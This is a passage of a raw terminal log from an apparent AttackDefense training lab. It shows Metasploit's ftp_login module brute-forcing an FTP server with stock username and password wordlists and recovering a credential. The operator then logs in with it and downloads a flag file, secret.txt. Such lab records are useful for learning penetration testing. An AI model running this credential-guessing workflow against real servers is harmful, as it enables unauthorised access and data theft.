   28  auxiliary/scanner/http/titan_ftp_admin_pwd                         normal  Yes    Titan FTP Administrative Password Disclosure
   29  auxiliary/scanner/portscan/ftpbounce                               normal  Yes    FTP Bounce Port Scanner
   30  auxiliary/scanner/snmp/cisco_config_tftp                           normal  Yes    Cisco IOS SNMP Configuration Grabber (TFTP)
   31  auxiliary/scanner/snmp/cisco_upload_file                           normal  Yes    Cisco IOS SNMP File Upload (TFTP)
   32  auxiliary/scanner/ssh/cerberus_sftp_enumusers     2014-05-27       normal  Yes    Cerberus FTP Server SFTP Username Enumeration
   33  auxiliary/scanner/tftp/ipswitch_whatsupgold_tftp  2011-12-12       normal  Yes    IpSwitch WhatsUp Gold TFTP Directory Traversal
   34  auxiliary/scanner/tftp/netdecision_tftp           2009-05-16       normal  Yes    NetDecision 4.2 TFTP Directory Traversal
   35  auxiliary/scanner/tftp/tftpbrute                                   normal  Yes    TFTP Brute Forcer
   36  auxiliary/server/capture/ftp                                       normal  No     Authentication Capture: FTP
   37  auxiliary/server/ftp                                               normal  No     FTP File Server
   38  auxiliary/server/tftp                                              normal  No     TFTP File Server
   39  auxiliary/server/wget_symlink_file_write          2014-10-27       normal  No     GNU Wget FTP Symlink Arbitrary Filesystem Access


msf5 > use auxiliary/scanner/ftp/ftp_login
msf5 auxiliary(scanner/ftp/ftp_login) > options

Module options (auxiliary/scanner/ftp/ftp_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   Proxies                            no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST      false            no        Record anonymous/guest logins to the database
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             21               yes       The target port (TCP)
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts

msf5 auxiliary(scanner/ftp/ftp_login) > set rhosts 192.90.201.3
rhosts => 192.90.201.3
msf5 auxiliary(scanner/ftp/ftp_login) > set user_file /usr/share/metasploit-framework/data/wordlists/common_users.txt
user_file => /usr/share/metasploit-framework/data/wordlists/common_users.txt
msf5 auxiliary(scanner/ftp/ftp_login) > set pass_file /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
pass_file => /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf5 auxiliary(scanner/ftp/ftp_login) > 
msf5 auxiliary(scanner/ftp/ftp_login) > run

[*] 192.90.201.3:21       - 192.90.201.3:21 - Starting FTP login sweep
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:admin (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:123456 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:12345 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:123456789 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:password (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:iloveyou (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:princess (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:1234567 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:12345678 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:abc123 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:nicole (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:daniel (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:babygirl (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:monkey (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:lovely (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: sysadmin:jessica (Incorrect: )
[+] 192.90.201.3:21       - 192.90.201.3:21 - Login Successful: sysadmin:654321
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:admin (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:123456 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:12345 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:123456789 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:password (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:iloveyou (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:princess (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:1234567 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:12345678 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:abc123 (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:nicole (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:daniel (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:babygirl (Incorrect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:monkey (Unable to Connect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:lovely (Unable to Connect: )
[-] 192.90.201.3:21       - 192.90.201.3:21 - LOGIN FAILED: rooty:jessica (Unable to Connect: )
[*] 192.90.201.3:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 > use auxiliary/scanner/ftp/ftp_login
msf5 auxiliary(scanner/ftp/ftp_login) > ftp 192.90.201.3
[*] exec: ftp 192.90.201.3

Connected to 192.90.201.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.90.201.3]
exit
Password:Name (192.90.201.3:root): 331 Password required for exit

Login failed.
530 Login incorrect.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> quit
221 Goodbye.
msf5 auxiliary(scanner/ftp/ftp_login) > back
msf5 > use auxiliary/scanner/ftp/anonymous
msf5 auxiliary(scanner/ftp/anonymous) > options

Module options (auxiliary/scanner/ftp/anonymous):

   Name     Current Setting      Required  Description
   ----     ---------------      --------  -----------
   FTPPASS  mozilla@example.com  no        The password for the specified username
   FTPUSER  anonymous            no        The username to authenticate as
   RHOSTS                        yes       The target address range or CIDR identifier
   RPORT    21                   yes       The target port (TCP)
   THREADS  1                    yes       The number of concurrent threads

msf5 auxiliary(scanner/ftp/anonymous) > set rhosts 192.90.201.3
rhosts => 192.90.201.3
msf5 auxiliary(scanner/ftp/anonymous) > run

[*] 192.90.201.3:21       - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf5 auxiliary(scanner/ftp/anonymous) > ftp 192.90.201.3
[*] exec: ftp 192.90.201.3

Connected to 192.90.201.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.90.201.3]
quit 
Password:Name (192.90.201.3:root): 331 Password required for quit

Login failed.
530 Login incorrect.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> quitit
?Invalid command
ftp> quit
221 Goodbye.
msf5 auxiliary(scanner/ftp/anonymous) > back
msf5 > exit
root@attackdefense:~# ftp 192.90.201.3
Connected to 192.90.201.3.
220 ProFTPD 1.3.5a Server (AttackDefense-FTP) [::ffff:192.90.201.3]
Name (192.90.201.3:root): sysadmin
331 Password required for sysadmin
Password:
230 User sysadmin logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 0        0              33 Nov 20  2018 secret.txt
226 Transfer complete
ftp> get secret.txt
local: secret.txt remote: secret.txt
200 PORT command successful
150 Opening BINARY mode data connection for secret.txt (33 bytes)
226 Transfer complete
33 bytes received in 0.00 secs (424.0337 kB/s)
ftp> quit
221 Goodbye.
root@attackdefense:~# cat secret.txt 
260ca9dd8a4577fc00b7bd5810298076
root@attackdefense:~# 
```
